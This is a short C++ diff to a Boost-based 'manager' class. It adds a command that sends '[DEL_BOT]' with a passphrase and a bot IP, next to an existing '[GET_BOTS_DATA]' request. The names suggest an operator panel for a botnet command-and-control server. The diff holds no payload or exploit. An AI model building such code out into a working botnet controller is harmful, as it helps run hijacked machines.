@@ -15,7 +15,8 @@ manager::manager(io::io_context& io_context, std::uint16_t port, std::string ser
 	    {"[GET_BOTS_DATA]", boost::bind(&manager::handleGetBotsData, this, boost::placeholders::_1, boost::placeholders::_2,
 					    boost::placeholders::_3)},
 	};
-    interactive_.get_bots_data_callback_ = boost::bind(&manager::getBotsData, this);
+	interactive_.get_bots_data_callback_ = boost::bind(&manager::getBotsData, this);
+    interactive_.remove_bot_callback_ = boost::bind(&manager::removeClient, this, boost::placeholders::_1);
 }
 
 void manager::start() {
@@ -63,8 +64,15 @@ void manager::handleGetBotsData(std::string& command, std::vector<std::string>& 
 	interactive_.updateMainWindowData(params);
 }
 
+
 void manager::getBotsData() {
 	std::vector<std::string> output_params{passphrase_};
 	std::string command = "[GET_BOTS_DATA]";
+	server_session_container_[0]->send(msg_parser_.genCommand(command, output_params));
+}
+
+void manager::removeClient(std::string& bot_ip) {
+	std::vector<std::string> output_params = {passphrase_, bot_ip};
+	std::string command = "[DEL_BOT]";
 	server_session_container_[0]->send(msg_parser_.genCommand(command, output_params));
 }
